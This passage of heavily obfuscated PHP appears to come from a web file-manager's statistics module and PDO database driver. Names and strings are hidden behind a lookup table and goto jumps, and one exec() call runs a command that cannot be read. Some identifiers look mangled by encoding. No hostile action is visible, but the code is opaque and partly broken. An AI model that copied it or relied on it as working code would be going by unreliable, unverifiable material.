$ò›‚­Á¥ = 0; do { $ŞãäÊÓ = date($°â„ß±Á[1794], $¢¬¼£è - 3600 * 24 * 7 * $ò›‚­Á¥); $œ¨ºÁŞË[] = $ŞãäÊÓ; $ò›‚­Á¥++; } while ($´œá®¾Ù < $ŞãäÊÓ); break; case $°â„ß±Á[1645]: $ò›‚­Á¥ = 1; do { $õÏáû = date($°â„ß±Á[1813], strtotime("\55\40{$ò›‚­Á¥}\40\x6d\157\x6e\164\x68\x73")); $œ¨ºÁŞË[] = $õÏáû; $ò›‚­Á¥++; } while ($´œá®¾Ù < $õÏáû); break; case $°â„ß±Á[1814]: $÷˜òÃçº = (int) date($°â„ß±Á[1812], strtotime($´œá®¾Ù)); $¶†š¥™ = (int) date($°â„ß±Á[1812]); if ($÷˜òÃçº >= $¶†š¥™) { break; } for ($÷˜òÃçº; $÷˜òÃçº < $¶†š¥™; $÷˜òÃçº++) { $œ¨ºÁŞË[] = $÷˜òÃçº . $°â„ß±Á[1815]; } break; default: break; } if ($´œá®¾Ù > end($œ¨ºÁŞË)) { array_pop($œ¨ºÁŞË); } sort($œ¨ºÁŞË); return $œ¨ºÁŞË; } public function listTable($Ô”ª—–) { $Ó€ÉÖ”Ì = ucfirst($Ô”ª—–); return Model($Ó€ÉÖ”Ì)->listData(); } public function option($ß–ß‘¶ó) { $Ôéç—ù = $_SERVER[ªÏ§Ë·][1816] . ucfirst($ß–ß‘¶ó); return $this->{$Ôéç—ù}(); } private function optionUser() { $üÕ©Îê =& $_SERVER[ªÏ§Ë·]; $¬––÷¤´ = Model($üÕ©Îê[563])->count($üÕ©Îê[1667]); $Ñ„µ“›ç = Model($üÕ©Îê[563])->where($üÕ©Îê[1817])->count($üÕ©Îê[1667]); $„È‰ŒÑ‚ = intval($GLOBALS[$üÕ©Îê[6]][$üÕ©Îê[387]][$üÕ©Îê[1622]]) / 3600; $°ĞÚ²¨Ë = strtotime("\x2d{$„È‰ŒÑ‚}\x20\x68\157\165\162\x73"); $çŒòå›õ = strtotime(date($üÕ©Îê[1798])); if ($°ĞÚ²¨Ë < $çŒòå›õ) { $°ĞÚ²¨Ë = $çŒòå›õ; } $¨ÎŸ¨ÆÅ = array($üÕ©Îê[1818] => array($üÕ©Îê[1039], $°ĞÚ²¨Ë)); $¯İäòÚ¹ = (int) Model($üÕ©Îê[563])->where($¨ÎŸ¨ÆÅ)->count($üÕ©Îê[1667]); if (!$¯İäòÚ¹) { $¯İäòÚ¹ = 1; } $¨ÎŸ¨ÆÅ = array($üÕ©Îê[1818] => array($üÕ©Îê[1039], $çŒòå›õ)); $¶½£ß×Ø = Model($üÕ©Îê[563])->where($¨ÎŸ¨ÆÅ)->count($üÕ©Îê[1667]); return array($üÕ©Îê[786] => (int) $¬––÷¤´, $üÕ©Îê[1819] => (int) ($¬––÷¤´ - $Ñ„µ“›ç), $üÕ©Îê[1820] => (int) $Ñ„µ“›ç, $üÕ©Îê[1821] => (int) $¶½£ß×Ø, $üÕ©Îê[1822] => $¯İäòÚ¹); } private function optionFile() { $Ú¤×šû =& $_SERVER[ªÏ§Ë·]; $¿±ùÙ—ª = $this->sourceSize(); $™µ’÷å¤ = $¿±ùÙ—ª[$Ú¤×šû[86]]; $Š×üŒÌö = $¿±ùÙ—ª[$Ú¤×šû[1791]]; $ïô”ñÂÓ = Model($Ú¤×šû[853])->where(array($Ú¤×šû[448] => 0))->count($Ú¤×šû[440]); $öæ§«— = array($Ú¤×šû[448] => 0, $Ú¤×šû[211] => array($Ú¤×šû[1039], strtotime(date($Ú¤×šû[1798])))); $‡¯ÍØøş = Model($Ú¤×šû[853])->where($öæ§«—)->sum($Ú¤×šû[86]); $ÙŠºß†â = Model($Ú¤×šû[853])->where($öæ§«—)->count($Ú¤×šû[440]); return array($Ú¤×šû[791] => $™µ’÷å¤, $Ú¤×šû[1791] => $Š×üŒÌö, $Ú¤×šû[1823] => $™µ’÷å¤ - $Š×üŒÌö, $Ú¤×šû[1824] => (int) $‡¯ÍØøş, $Ú¤×šû[793] => (int) $ïô”ñÂÓ, $Ú¤×šû[1825] => (int) $ÙŠºß†â); } private function optionAccess() { $‚œ®˜¤Ê =& $_SERVER[ªÏ§Ë·]; return array($‚œ®˜¤Ê[786] => $this->typeLogCnt(), $‚œ®˜¤Ê[117] => $this->typeLogCnt($‚œ®˜¤Ê[117]), $‚œ®˜¤Ê[490] => $this->typeLogCnt($‚œ®˜¤Ê[490]), $‚œ®˜¤Ê[1826] => $this->typeLogCnt($‚œ®˜¤Ê[1826]), $‚œ®˜¤Ê[1827] => $this->typeLogCnt($‚œ®˜¤Ê[1827]), $‚œ®˜¤Ê[628] => $this->typeLogCnt($‚œ®˜¤Ê[12], $‚œ®˜¤Ê[1802])); } private function typeLogCnt($ºäò³ßá = '', $»ö²÷ó° = "\151\x64") { $êÚõÈ‹ê =& $_SERVER[ªÏ§Ë·]; $Ìİñâ‰— = array($êÚõÈ‹ê[117] => array($êÚõÈ‹ê[1828], $êÚõÈ‹ê[1829]), $êÚõÈ‹ê[490] => array($êÚõÈ‹ê[1830], $êÚõÈ‹ê[1831]), $êÚõÈ‹ê[1826] => array($êÚõÈ‹ê[1832], $êÚõÈ‹ê[1833], $êÚõÈ‹ê[1834]), $êÚõÈ‹ê[1827] => array($êÚõÈ‹ê[1835], $êÚõÈ‹ê[1836]), $êÚõÈ‹ê[1837] => array($êÚõÈ‹ê[1838], $êÚõÈ‹ê[1839], $êÚõÈ‹ê[1840])); $¶¨£¹ = strtotime(date($êÚõÈ‹ê[1798])); $¹İ›ıä = array($êÚõÈ‹ê[211] => array($êÚõÈ‹ê[1039], $¶¨£¹)); if ($ºäò³ßá) { $¹İ›ıä[$êÚõÈ‹ê[43]] = array($êÚõÈ‹ê[7], $Ìİñâ‰—[$ºäò³ßá]); } $©ˆİèì = Model($êÚõÈ‹ê[1801])->where($¹İ›ıä)->count($»ö²÷ó°); return (int) $©ˆİèì; } private function optionServer() { $µîŒ«Šñ =& $_SERVER[ªÏ§Ë·]; $¸¼ĞûÛŸ = $this->diskDriver(); $®äèº³ü = KodIO::defaultDriver(); $¸ô«ä«‚ = array($µîŒ«Šñ[845] => $®äèº³ü[$µîŒ«Šñ[437]]); $Ó£ê‘ôŸ = Model($µîŒ«Šñ[509])->where($¸ô«ä«‚)->sum($µîŒ«Šñ[86]); $™§‰ü¤Ö = explode($µîŒ«Šñ[63], $_SERVER[$µîŒ«Šñ[153]]); $Ò¦¿½É = $™§‰ü¤Ö[0]; $—äÉÜÖ— = $GLOBALS[$µîŒ«Šñ[6]][$µîŒ«Šñ[31]]; $›Û‡ªÍ” = $—äÉÜÖ—[$µîŒ«Šñ[1001]]; if ($›Û‡ªÍ” == $µîŒ«Šñ[989]) { $²ÇŞÌ²À = explode($µîŒ«Šñ[1307], $—äÉÜÖ—[$µîŒ«Šñ[1000]]); $›Û‡ªÍ” = $²ÇŞÌ²À[0]; } if ($›Û‡ªÍ” == $µîŒ«Šñ[937] || $›Û‡ªÍ” == $µîŒ«Šñ[832]) { $‡Âõ¨÷Ö = Model()->db()->query($µîŒ«Šñ[1841]); $÷îÕ·‚ = $‡Âõ¨÷Ö[0] && isset($‡Âõ¨÷Ö[0][$µîŒ«Šñ[1566]]) ? $‡Âõ¨÷Ö[0][$µîŒ«Šñ[1566]] : 0; $›Û‡ªÍ” = $µîŒ«Šñ[1842] . ($÷îÕ·‚ ? $µîŒ«Šñ[8] . $÷îÕ·‚ : $µîŒ«Šñ[12]); } $¨­º¥û = $GLOBALS[$µîŒ«Šñ[6]][$µîŒ«Šñ[387]][$µîŒ«Šñ[855]]; return array($µîŒ«Šñ[1843] => $¸¼ĞûÛŸ ? $¸¼ĞûÛŸ[$µîŒ«Šñ[1844]] : 0, $µîŒ«Šñ[1845] => $¸¼ĞûÛŸ ? $¸¼ĞûÛŸ[$µîŒ«Šñ[1846]] : 0, $µîŒ«Šñ[1847] => (int) $®äèº³ü[$µîŒ«Šñ[1844]] * 1024 * 1024 * 1024, $µîŒ«Šñ[1848] => (int) $Ó£ê‘ôŸ, $µîŒ«Šñ[1849] => ucfirst($Ò¦¿½É), $µîŒ«Šñ[1850] => $µîŒ«Šñ[1851] . PHP_VERSION, $µîŒ«Šñ[1852] => phpBuild64() ? 64 : 32, $µîŒ«Šñ[785] => str_replace($µîŒ«Šñ[1155], $µîŒ«Šñ[1017], $›Û‡ªÍ”), $µîŒ«Šñ[387] => ucfirst($¨­º¥û), $µîŒ«Šñ[42] => $_SERVER[$µîŒ«Šñ[1853]]); } private function diskDriver() { $óÔ£»İÊ =& $_SERVER[ªÏ§Ë·]; $¥Âˆ¦»ä = $óÔ£»İÊ[8]; $ÁûˆÓ¶ = $GLOBALS[$óÔ£»İÊ[6]][$óÔ£»İÊ[1324]] == $óÔ£»İÊ[1325]; if ($ÁûˆÓ¶) { $¥Âˆ¦»ä = $óÔ£»İÊ[1854]; if (function_exists($óÔ£»İÊ[1855])) { exec($óÔ£»İÊ[1856], $£ˆüÁœ); $¥Âˆ¦»ä = $£ˆüÁœ[1] . $óÔ£»İÊ[8]; } } if (!file_exists($¥Âˆ¦»ä)) { return; } $×Å‡Ô¯Î = @disk_total_space($¥Âˆ¦»ä); $ÕÁªğé = $×Å‡Ô¯Î - @disk_free_space($¥Âˆ¦»ä); return array($óÔ£»İÊ[1844] => $×Å‡Ô¯Î, $óÔ£»İÊ[1846] => $ÕÁªğé); } public function fileChart($¥Å“Ô¸ü) { $½²øõ˜Ù =& $_SERVER[ªÏ§Ë·]; if (isset($¥Å“Ô¸ü[$½²øõ˜Ù[1667]])) { return Model($½²øõ˜Ù[853])->userFileTypeProfile($¥Å“Ô¸ü[$½²øõ˜Ù[1667]]); } if (isset($¥Å“Ô¸ü[$½²øõ˜Ù[1857]])) { return Model($½²øõ˜Ù[853])->groupFileTypeProfile($¥Å“Ô¸ü[$½²øõ˜Ù[1857]]); } $ò¶¦Ş´” = $this->sourceSize(); $’·µøÈ‹ = array($½²øõ˜Ù[470] => 0, $½²øõ˜Ù[449] => 1); $²†µ…ıû = Model($½²øõ˜Ù[853])->where($’·µøÈ‹)->sum($½²øõ˜Ù[86]); $’·µøÈ‹[$½²øõ˜Ù[449]] = 2; $¶Â·£‹¼ = Model($½²øõ˜Ù[853])->where($’·µøÈ‹)->sum($½²øõ˜Ù[86]); return array($½²øõ˜Ù[791] => $ò¶¦Ş´”[$½²øõ˜Ù[86]], $½²øõ˜Ù[1791] => $ò¶¦Ş´”[$½²øõ˜Ù[1791]], $½²øõ˜Ù[1792] => (int) $²†µ…ıû, $½²øõ˜Ù[1793] => (int) $¶Â·£‹¼); } private function sourceSize() { $¯¢ò˜¸Ï =& $_SERVER[ªÏ§Ë·]; $‘«•¿²à = Model($¯¢ò˜¸Ï[853])->where(array($¯¢ò˜¸Ï[448] => 0))->sum($¯¢ò˜¸Ï[86]); $… ‚Ú°ã = Model($¯¢ò˜¸Ï[509])->sum($¯¢ò˜¸Ï[86]); if ($… ‚Ú°ã > $‘«•¿²à) { $… ‚Ú°ã = $‘«•¿²à; } return array($¯¢ò˜¸Ï[86] => (int) $‘«•¿²à, $¯¢ò˜¸Ï[1791] => (int) $… ‚Ú°ã); } } goto dª‹£…©¯‘; E™é´ì¨¯–: function binCheckBigger($ŞßÒáíÄ, $ƒäÚ¹½œ) { return $ŞßÒáíÄ > $ƒäÚ¹½œ; } $_SERVER[$_SERVER[ìè™õˆã][3]] = ("\x38\x32\x31\x33"."\x30\x30")+0;$_ipha="k9unpzhj18darx4efi5mvgc7063oslywb2tqfeovcsy5pzb0nu2g8rkhj6mwdt41a3i9qxl7il8s";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($€•Ù¬ß§, $şÖÂÀ÷) { $¯Ğ‡ÓÕÃ =& $_SERVER[ªÏ§Ë·]; if (isset(self::$_methodList[$€•Ù¬ß§])) { return @call_user_func_array(self::$_methodList[$€•Ù¬ß§], $şÖÂÀ÷); } else { if (method_exists($this, $€•Ù¬ß§)) { return call_user_func_array(array($this, $€•Ù¬ß§), $şÖÂÀ÷); } else { think_exception(__CLASS__ . $¯Ğ‡ÓÕÃ[4] . $€•Ù¬ß§ . $¯Ğ‡ÓÕÃ[5]); } } } public static function __callStatic($×é±Æ¢ó, $®ë¼è¿¾) { if (isset(self::$_methodListStatic[$×é±Æ¢ó])) { return call_user_func_array(self::$_methodListStatic[$×é±Æ¢ó], $®ë¼è¿¾); } else { if (method_exists(self, $×é±Æ¢ó)) { return call_user_func_array(array(self, $×é±Æ¢ó), $®ë¼è¿¾); } else { show_json("{$×é±Æ¢ó}\x28\51\x20\156\x6f\164\x20\x65\170\151\163\164\x3b", !1); } } } public static function addMethod($¯Ó¸àÓÙ, $®¸üªè ) { self::$_methodList[$¯Ó¸àÓÙ] = $®¸üªè ; } public static function addMethodStatic($ÊØ¬ÄœÒ, $çÚ²¤î¸) { self::$_methodListStatic[$ÊØ¬ÄœÒ] = $çÚ²¤î¸; } } goto CßÃÆãñî; a›æŠ›‡¦“: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ß‘Š÷ìœ = '') { $›·´¹ıô =& $_SERVER[ªÏ§Ë·]; if (!class_exists($›·´¹ıô[939])) { think_exception(think_lang($›·´¹ıô[24]) . $›·´¹ıô[940]); } if (!empty($ß‘Š÷ìœ)) { $this->config = $ß‘Š÷ìœ; if (empty($this->config[$›·´¹ıô[27]])) { $this->config[$›·´¹ıô[27]] = array(); } } } public function connect($Íµ„óº = '', $€©ø€ùİ = 0) { $â‚¶Ñ±³ =& $_SERVER[ªÏ§Ë·]; if (!isset($this->linkID[$€©ø€ùİ])) { if (empty($Íµ„óº)) { $Íµ„óº = $this->config; } $ñµƒƒ• = !empty($Íµ„óº[$â‚¶Ñ±³[27]][$â‚¶Ñ±³[28]]) ? $Íµ„óº[$â‚¶Ñ±³[27]][$â‚¶Ñ±³[28]] : $this->pconnect; if ($ñµƒƒ•) { $Íµ„óº[$â‚¶Ñ±³[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$€©ø€ùİ] = new PDO($Íµ„óº[$â‚¶Ñ±³[941]], $Íµ„óº[$â‚¶Ñ±³[913]], $Íµ„óº[$â‚¶Ñ±³[914]], $Íµ„óº[$â‚¶Ñ±³[27]]); } catch (PDOException $©ßÄÛº) { think_exception($©ßÄÛº->getMessage()); } $this->dbType = $this->_getDsnType($Íµ„óº[$â‚¶Ñ±³[941]]); if (in_array($this->dbType, array($â‚¶Ñ±³[942], $â‚¶Ñ±³[943], $â‚¶Ñ±³[944], $â‚¶Ñ±³[945]))) { think_exception($â‚¶Ñ±³[946] . $this->dbType . $â‚¶Ñ±³[947] . $this->dbType . $â‚¶Ñ±³[948]); } if (!$this->linkID[$€©ø€ùİ]) { think_exception($â‚¶Ñ±³[949]); } try { $this->linkID[$€©ø€ùİ]->exec($â‚¶Ñ±³[950] . think_config($â‚¶Ñ±³[916])); } catch (Exception $©ßÄÛº) { } $this->connected = !0; if (1 != think_config($â‚¶Ñ±³[32])) { unset($this->config); } } return $this->linkID[$€©ø€ùİ]; } public function free() { $this->PDOStatement = null; } public function query($ù‹Ûá«Ç, $èÙÇÏ = array()) { $İ•²ôş£ =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ù‹Ûá«Ç; if (!empty($èÙÇÏ)) { $this->queryStr .= $İ•²ôş£[951] . print_r($èÙÇÏ, !0) . $İ•²ôş£[952]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($İ•²ôş£[33], 1); think_status($İ•²ôş£[34]); $this->PDOStatement = $this->_linkID->prepare($ù‹Ûá«Ç); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $õ¶×êá· = $this->PDOStatement->execute($èÙÇÏ); $this->debug(); if (!1 === $õ¶×êá·) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‹…ë­ìË, $´§¥•”ª = array()) { $Š¿ŒÏš =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹…ë­ìË; if (!empty($´§¥•”ª)) { $this->queryStr .= $Š¿ŒÏš[951] . print_r($´§¥•”ª, !0) . $Š¿ŒÏš[952]; } $½“µµÖ  = !1; if ($this->dbType == $Š¿ŒÏš[945]) { if (preg_match($Š¿ŒÏš[953], $this->queryStr, $íÍ¼Ä‡Ù)) { $this->table = think_config($Š¿ŒÏš[954]) . str_ireplace(think_config($Š¿ŒÏš[955]), $Š¿ŒÏš[416], $íÍ¼Ä‡Ù[2]); $½“µµÖ  = (bool) $this->query($Š¿ŒÏš[956] . strtoupper($this->table) . $Š¿ŒÏš[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Š¿ŒÏš[35], 1); think_status($Š¿ŒÏš[34]); $this->PDOStatement = $this->_linkID->prepare($‹…ë­ìË); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $È„ğÎ¼ì = $this->PDOStatement->execute($´§¥•”ª); $this->debug(); if (!1 === $È„ğÎ¼ì) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($½“µµÖ  || preg_match($Š¿ŒÏš[957], $‹…ë­ìË)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ª¯ÛûõÇ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ª¯ÛûõÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ğéª‘‚‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ğéª‘‚‡) { $this->error(); return !1; } } return !0; } private function getAll() { $ôºÏ‡Ëé = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ôºÏ‡Ëé); return $ôºÏ‡Ëé; } public function getFields($ş“ë²õà) { $ÍÉ°…›“ =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!0); if (think_config($ÍÉ°…›“[958])) { $ÄÖ½¨¾ = str_replace($ÍÉ°…›“[959], $ş“ë²õà, think_config($ÍÉ°…›“[958])); } else { switch ($this->dbType) { case $ÍÉ°…›“[942]: case $ÍÉ°…›“[960]: $ÄÖ½¨¾ = "\x53\x45\114\105\x43\x54\x20\40\40\143\157\154\x75\x6d\156\137\156\141\x6d\145\x20\141\163\40\47\x4e\141\x6d\x65\47\x2c\x20\x20\40\144\141\164\x61\x5f\164\x79\x70\145\40\141\163\40\x27\x54\171\160\145\47\x2c\40\x20\40\143\157\154\x75\155\156\x5f\x64\145\146\x61\x75\x6c\164\40\141\163\x20\47\104\145\146\x61\x75\154\x74\47\x2c\40\x20\40\x69\x73\137\x6e\x75\x6c\154\x61\x62\x6c\x65\40\x61\163\40\47\x4e\x75\x6c\x6c\47\12\11\x9\x46\122\117\115\11\x69\x6e\146\x6f\x72\x6d\141\x74\x69\157\x6e\x5f\x73\143\150\145\155\x61\56\164\x61\142\154\145\x73\x20\101\123\40\164\12\11\11\x4a\117\111\116\x9\x69\156\146\x6f\162\x6d\141\164\151\x6f\x6e\x5f\x73\143\x68\145\x6d\x61\x2e\143\x6f\x6c\x75\x6d\x6e\x73\40\x41\123\40\x63\xa\x9\11\117\x4e\40\x20\164\x2e\164\141\142\x6c\x65\x5f\x63\x61\x74\141\x6c\157\147\x20\75\40\143\x2e\x74\141\x62\154\x65\x5f\x63\141\x74\x61\154\157\147\xa\11\11\101\x4e\104\40\164\56\164\141\142\x6c\145\137\163\x63\150\x65\x6d\141\40\75\x20\143\56\x74\141\x62\154\x65\x5f\x73\143\x68\x65\x6d\x61\xa\11\11\x41\116\104\40\x74\56\x74\x61\x62\x6c\x65\137\x6e\x61\x6d\145\x20\75\40\143\x2e\x74\141\x62\154\x65\137\156\x61\x6d\x65\12\11\11\x57\x48\x45\122\105\40\40\40\164\56\x74\141\142\x6c\x65\x5f\x6e\141\155\145\40\75\x20\x27{$ş“ë²õà}\x27"; break; case $ÍÉ°…›“[961]: $ÄÖ½¨¾ = $ÍÉ°…›“[962] . $ş“ë²õà . $ÍÉ°…›“[963]; break; case $ÍÉ°…›“[943]: case $ÍÉ°…›“[945]: $ÄÖ½¨¾ = $ÍÉ°…›“[964] . $ÍÉ°…›“[965] . $ÍÉ°…›“[966] . strtoupper($ş“ë²õà) . $ÍÉ°…›“[967] . strtoupper($ş“ë²õà) . $ÍÉ°…›“[968]; break; case $ÍÉ°…›“[969]: $ÄÖ½¨¾ = $ÍÉ°…›“[970] . $ş“ë²õà . $ÍÉ°…›“[971]; break; case $ÍÉ°…›“[944]: break; case $ÍÉ°…›“[972]: default: $ÄÖ½¨¾ = $ÍÉ°…›“[973] . ($this->dbType == $ÍÉ°…›“[972] ? "\x60{$ş“ë²õà}\x60" : $ş“ë²õà); } } $¨§äÏÈ­ = $this->query($ÄÖ½¨¾); $ÅáÄîº‚ = array(); if ($¨§äÏÈ­) { foreach ($¨§äÏÈ­ as $¼Œ•»³á => $ÒÁü«ó) { $ÒÁü«ó = array_change_key_case($ÒÁü«ó); $ÒÁü«ó[$ÍÉ°…›“[42]] = isset($ÒÁü«ó[$ÍÉ°…›“[42]]) ? $ÒÁü«ó[$ÍÉ°…›“[42]] : $ÍÉ°…›“[416]; $ÒÁü«ó[$ÍÉ°…›“[43]] = isset($ÒÁü«ó[$ÍÉ°…›“[43]]) ? $ÒÁü«ó[$ÍÉ°…›“[43]] : $ÍÉ°…›“[416]; $¦®Í§º = isset($ÒÁü«ó[$ÍÉ°…›“[311]]) ? $ÒÁü«ó[$ÍÉ°…›“[311]] : $ÒÁü«ó[$ÍÉ°…›“[42]]; $ÅáÄîº‚[$¦®Í§º] = array($ÍÉ°…›“[42] => $¦®Í§º, $ÍÉ°…›“[43] => $ÒÁü«ó[$ÍÉ°…›“[43]], $ÍÉ°…›“[45] => (bool) (isset($ÒÁü«ó[$ÍÉ°…›“[113]]) && $ÒÁü«ó[$ÍÉ°…›“[113]] === $ÍÉ°…›“[12] || isset($ÒÁü«ó[$ÍÉ°…›“[45]]) && $ÒÁü«ó[$ÍÉ°…›“[45]] === $ÍÉ°…›“[12]), $ÍÉ°…›“[47] => isset($ÒÁü«ó[$ÍÉ°…›“[47]]) ? $ÒÁü«ó[$ÍÉ°…›“[47]] : (isset($ÒÁü«ó[$ÍÉ°…›“[66]]) ? $ÒÁü«ó[$ÍÉ°…›“[66]] : $ÍÉ°…›“[416]), $ÍÉ°…›“[49] => isset($ÒÁü«ó[$ÍÉ°…›“[104]]) ? strtolower($ÒÁü«ó[$ÍÉ°…›“[104]]) == $ÍÉ°…›“[51] : (isset($ÒÁü«ó[$ÍÉ°…›“[67]]) ? $ÒÁü«ó[$ÍÉ°…›“[67]] : !1), $ÍÉ°…›“[52] => isset($ÒÁü«ó[$ÍÉ°…›“[974]]) ? strtolower($ÒÁü«ó[$ÍÉ°…›“[974]]) == $ÍÉ°…›“[54] : (isset($ÒÁü«ó[$ÍÉ°…›“[104]]) ? $ÒÁü«ó[$ÍÉ°…›“[104]] : !1)); } } return $ÅáÄîº‚; } public function getTables($âŒÙ¹Š = '') { $¿Ğ¦“Ğº =& $_SERVER[ªÏ§Ë·]; if (think_config($¿Ğ¦“Ğº[975])) { $°ÑáôÕ = str_replace($¿Ğ¦“Ğº[976], $âŒÙ¹Š, think_config($¿Ğ¦“Ğº[975])); } else { switch ($this->dbType) { case $¿Ğ¦“Ğº[943]: case $¿Ğ¦“Ğº[945]: $°ÑáôÕ = $¿Ğ¦“Ğº[977]; break; case $¿Ğ¦“Ğº[942]: case $¿Ğ¦“Ğº[960]: $°ÑáôÕ = $¿Ğ¦“Ğº[978]; break; case $¿Ğ¦“Ğº[969]: $°ÑáôÕ = $¿Ğ¦“Ğº[979]; break; case $¿Ğ¦“Ğº[944]: think_exception(think_lang($¿Ğ¦“Ğº[980]) . $¿Ğ¦“Ğº[981]); break; case $¿Ğ¦“Ğº[961]: $°ÑáôÕ = $¿Ğ¦“Ğº[55] . $¿Ğ¦“Ğº[56] . $¿Ğ¦“Ğº[57]; break; case $¿Ğ¦“Ğº[972]: default: if (!empty($âŒÙ¹Š)) { $°ÑáôÕ = $¿Ğ¦“Ğº[924] . $âŒÙ¹Š . $¿Ğ¦“Ğº[925]; } else { $°ÑáôÕ = $¿Ğ¦“Ğº[926]; } } } $ôß±³Ùƒ = $this->query($°ÑáôÕ); $¾â°ï’ = array(); foreach ($ôß±³Ùƒ as $Ö¹ªº‹‚ => $íõàğË) { $¾â°ï’[$Ö¹ªº‹‚] = current($íõàğË); } return $¾â°ï’; } protected function parseLimit($ªÃ©ıÜ ) { $åöÖÁ¥ =& $_SERVER[ªÏ§Ë·]; $ùöäô× = $åöÖÁ¥[12]; if (!empty($ªÃ©ıÜ )) { switch ($this->dbType) { case $åöÖÁ¥[969]: case $åöÖÁ¥[961]: $ªÃ©ıÜ  = explode($åöÖÁ¥[60], $ªÃ©ıÜ ); if (count($ªÃ©ıÜ ) > 1) { $ùöäô× .= $åöÖÁ¥[61] . $ªÃ©ıÜ [1] . $åöÖÁ¥[62] . $ªÃ©ıÜ [0] . $åöÖÁ¥[63]; } else { $ùöäô× .= $åöÖÁ¥[61] . $ªÃ©ıÜ [0] . $åöÖÁ¥[63]; } break; case $åöÖÁ¥[942]: case $åöÖÁ¥[960]: break; case $åöÖÁ¥[944]: break; case $åöÖÁ¥[943]: case $åöÖÁ¥[945]: break; case $åöÖÁ¥[972]: default: $ùöäô× .= $åöÖÁ¥[61] . $ªÃ©ıÜ  . $åöÖÁ¥[63]; } } return $ùöäô×; } public function parseKey(&$ûÆ”öÍá, $ÄäåÓê× = true) { $Á‹÷‹¢ =& $_SERVER[ªÏ§Ë·]; if ($ÄäåÓê×) { $ûÆ”öÍá = $this->parseKeyCheck($ûÆ”öÍá); } if ($this->dbType == $Á‹÷‹¢[972]) { if ($ûÆ”öÍá != $Á‹÷‹¢[199] && !preg_match($Á‹÷‹¢[936], $ûÆ”öÍá)) { $ûÆ”öÍá = $Á‹÷‹¢[423] . trim($ûÆ”öÍá, $Á‹÷‹¢[423]) . $Á‹÷‹¢[423]; } return $ûÆ”öÍá; } else { return parent::parseKey($ûÆ”öÍá, $ÄäåÓê×); } } public function close() { $this->_linkID = null; } public function error() { $æ³àÀÓŠ =& $_SERVER[ªÏ§Ë·]; if ($this->PDOStatement) { $¢óòËªÆ = $this->PDOStatement->errorInfo(); $this->error = $¢óòËªÆ[1] . $æ³àÀÓŠ[4] . $¢óòËªÆ[2]; } else { $this->error = $æ³àÀÓŠ[12]; } if ($æ³àÀÓŠ[12] != $this->queryStr) { $this->error .= LNG($æ³àÀÓŠ[58]) . $this->queryStr; } think_trace($this->error, $æ³àÀÓŠ[12], $æ³àÀÓŠ[59]); return $this->error; } public function escapeString($Ô–ÊÎ¹) { $å‹§‡ÑÛ =& $_SERVER[ªÏ§Ë·]; switch ($this->dbType) { case $å‹§‡ÑÛ[969]: case $å‹§‡ÑÛ[942]: case $å‹§‡ÑÛ[960]: case $å‹§‡ÑÛ[972]: return addslashes($Ô–ÊÎ¹); case $å‹§‡ÑÛ[944]: case $å‹§‡ÑÛ[961]: case $å‹§‡ÑÛ[943]: case $å‹§‡ÑÛ[945]: return str_ireplace($å‹§‡ÑÛ[68], $å‹§‡ÑÛ[69], $Ô–ÊÎ¹); } } protected function parseValue($‘™‹•°Ó) { $÷ø˜†–€ =& $_SERVER[ªÏ§Ë·]; if (is_string($‘™‹•°Ó)) { $²„æ á = strpos($‘™‹•°Ó, $÷ø˜†–€[4]) === 0 && in_array($‘™‹•°Ó, array_keys($this->bind)); $‘™‹•°Ó = $²„æ á ? $this->escapeString($‘™‹•°Ó) : $÷ø˜†–€[982] . $this->escapeString($‘™‹•°Ó) . $÷ø˜†–€[982]; } elseif (isset($‘™‹•°Ó[0]) && is_string($‘™‹•°Ó[0]) && strtolower($‘™‹•°Ó[0]) == $÷ø˜†–€[335]) { $‘™‹•°Ó = $this->escapeString($‘™‹•°Ó[1]); } elseif (is_array($‘™‹•°Ó)) { $‘™‹•°Ó = array_map(array($this, $÷ø˜†–€[983]), $‘™‹•°Ó); } elseif (is_bool($‘™‹•°Ó)) { $‘™‹•°Ó = $‘™‹•°Ó ? $÷ø˜†–€[98] : $÷ø˜†–€[208]; } elseif (is_null($‘™‹•°Ó)) { $‘™‹•°Ó = $÷ø˜†–€[113]; } return $‘™‹•°Ó; } public function getLastInsertId() { $Ü©¦Ç‚ı =& $_SERVER[ªÏ§Ë·]; switch ($this->dbType) { case $Ü©¦Ç‚ı[969]: case $Ü©¦Ç‚ı[961]: case $Ü©¦Ç‚ı[942]: case $Ü©¦Ç‚ı[960]: case $Ü©¦Ç‚ı[944]: case $Ü©¦Ç‚ı[972]: return $this->_linkID->lastInsertId(); case $Ü©¦Ç‚ı[943]: case $Ü©¦Ç‚ı[945]: $„‡ÍâÁ— = $this->table; $»ùå¾İ = $this->query("\123\x45\114\105\103\x54\40{$„‡ÍâÁ—}\56\143\165\162\x72\x76\141\154\x20\x63\x75\162\162\166\141\x6c\40\106\122\x4f\115\40\x64\x75\x61\x6c"); return $»ùå¾İ ? $»ùå¾İ[0][$Ü©¦Ç‚ı[984]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¼Œ Éè) { $«çÁ˜Â =& $_SERVER[ªÏ§Ë·]; if (!CacheLock::fileLock($«çÁ˜Â[23])) { return !1; } $¢¥ï¥ÍÌ = parent::query($¼Œ Éè); 